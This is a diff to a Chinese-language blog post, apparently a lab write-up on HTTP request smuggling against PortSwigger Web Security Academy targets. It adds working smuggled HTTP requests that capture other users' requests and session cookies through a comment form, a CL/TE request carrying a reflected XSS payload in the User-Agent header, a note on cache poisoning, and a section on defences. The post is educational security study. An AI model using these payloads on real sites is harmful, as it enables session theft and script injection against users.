@@ -604,9 +604,77 @@ search=0xGeekCat
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2029.png" alt="screenshot 29"></p>
 <p><strong>carlos删除成功</strong></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2030.png" alt="screenshot 30"></p>
-<h2 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h2><p>👆实验中通过走私一个内容长度不够的请求来获取前端服务器添加的字段，而重写的头字段来自于后续发送的请求。换句话说，我们通过请求走私获取了走私请求之后的请求</p>
-<p><strong>❓如果在的请求走私发生后，其他用户也进行了请求会怎么办，POST请求会将获得的数据存储并展示出来嘛？</strong></p>
-<p>那么可以通过走私恶意请求，将其他用户的请求信息拼接到走私请求并存储到网站中，之后再查看这些数据就能获取到用户请求。这中方法可以用来窃取用户的敏感信息</p>
+<h2 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h2><p>👆实验中通过走私一个内容长度不够的请求来获取前端服务器添加的字段，而重写的头字段来自于后续发送的请求。换句话说，通过请求走私获取了走私请求之后的请求</p>
+<p><strong>❓如果在请求走私发生后，其他用户也进行了请求会发生什么，POST请求会将获得的数据存储并展示出来嘛？</strong></p>
+<p>可以通过走私恶意请求将其他用户的请求信息拼接到走私请求中并存储到网站中，之后再查看这些数据就能获取到用户请求。这种方法可以用来窃取用户的敏感信息</p>
+<p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">实验</a>目的是通过获取其他用户的Cookie用来访问其他账号</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2031.png" alt="screenshot 31"></p>
+<p>首先寻找一个能够将传入的请求存储到网站中的POST请求表单</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2032.png" alt="screenshot 32"></p>
+<p><strong>抓取评论区POST请求</strong></p>
+<pre><code>POST /post/comment HTTP/1.1
+Host: ac501f991f002d7c804c09e000a900ef.web-security-academy.net
+Connection: close
+Content-Length: 105
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+Origin: https://ac501f991f002d7c804c09e000a900ef.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://ac501f991f002d7c804c09e000a900ef.web-security-academy.net/post?postId=4
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=rzbegF0YHZ7SjXt3x2zWoLcfvQ2npnFM
+
+csrf=xDOH0tH1TxXCAKpXqIp9WbY0hKzYm2AF&amp;postId=4&amp;comment=test&amp;name=0xGeekCat&amp;email=hacker%40hacker&amp;website=</code></pre>
+<p><strong>根据👆POST改造数据包</strong></p>
+<pre><code>POST / HTTP/1.1
+Host: ac501f991f002d7c804c09e000a900ef.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 276
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=rzbegF0YHZ7SjXt3x2zWoLcfvQ2npnFM
+
+csrf=xDOH0tH1TxXCAKpXqIp9WbY0hKzYm2AF&amp;postId=4&amp;comment=test&amp;name=0xGeekCat&amp;email=hacker%40hacker&amp;website=&amp;comment=test </code></pre>
+<p>提交一次请求包之后等待受害者进行请求</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2033.png" alt="screenshot 33"></p>
+<p>靶机中其他用户回复时间较慢，所以直接自己亲自作为受害者进行请求</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2034.png" alt="screenshot 34"></p>
+<h2 id="利用反射型XSS"><a href="#利用反射型XSS" class="headerlink" title="利用反射型XSS"></a>利用反射型XSS</h2><p><a href="https://ac151f5a1f0d98b880771e30002e00c0.web-security-academy.net/post?postId=1" target="_blank" rel="noopener">实验</a>使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2035.png" alt="screenshot 35"></p>
+<pre><code>POST / HTTP/1.1
+Host: ac151f5a1f0d98b880771e30002e00c0.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=sbr5uM7KbSlTw3VNTSE9r3Rd4AH0ACRL
+Content-Length: 127
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;# 👈
+Content-Type: application/x-www-form-urlencoded
+
+ 👈 空出一行要么不空</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2036.png" alt="screenshot 36"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2037.png" alt="screenshot 37"></p>
+<h2 id="进行缓存投毒"><a href="#进行缓存投毒" class="headerlink" title="进行缓存投毒"></a>进行缓存投毒</h2><p>一般来说前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，<strong>从而影响后续访问的所有用户</strong></p>
+<p><strong>❌暂时还未了解缓存投毒，以后再深入研究，留一个坑</strong></p>
+<h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>针对特定的服务器，通用的防御措施大概有三种</p>
+<ul>
+<li>禁用代理服务器与后端服务器之间的TCP连接重用</li>
+<li>使用HTTP/2协议</li>
+<li>前后端使用相同的服务器</li>
+</ul>
+<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。</p>
+<p>🔔从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的</p>
+<h1 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h1><p>请求体中的空行究竟什么时候空，要空几个一直没想明白，也没找到规律，如果有师傅了解还请务必联系我，谢谢</p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p>
 <p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
 <p><strong>郑重感谢</strong></p>
